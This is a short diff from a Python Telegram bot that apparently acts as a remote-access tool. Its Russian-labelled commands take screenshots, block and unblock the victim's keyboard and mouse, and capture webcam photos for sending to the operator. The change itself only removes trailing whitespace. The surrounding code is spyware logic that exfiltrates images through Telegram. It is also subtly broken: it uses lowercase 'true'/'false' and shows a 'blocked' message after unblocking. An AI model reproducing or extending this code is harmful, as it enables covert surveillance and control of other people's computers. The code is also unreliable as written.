@@ -41,17 +41,17 @@ async def fun_command(message: types.Message, state: FSMContext):
         os.remove(f'{funcs.PATH}ss.png')
         await bot.send_message(identify, return_message("Скриншот готов\n"))
         await state.finish()
-    
+
     elif data['choosen'] == "Блок мышки и клавы":
         fun_commands.Fun_funcs.blockUnblockKeyMouse(true)
         await bot.send_message(identify, return_message("Заблокировано\n"))
         await state.finish()
-    
+
     elif data['choosen'] == "Анблок мышки и клавы":
         fun_commands.Fun_funcs.blockUnblockKeyMouse(false)
         await bot.send_message(identify, return_message("Заблокировано\n"))
         await state.finish()
-    
+
     elif data['choosen'] == "Фото с камеры":
         fun_commands.Fun_funcs.get_photo_from_camera()
         photo = open(f'{funcs.PATH}cam.png', 'rb')
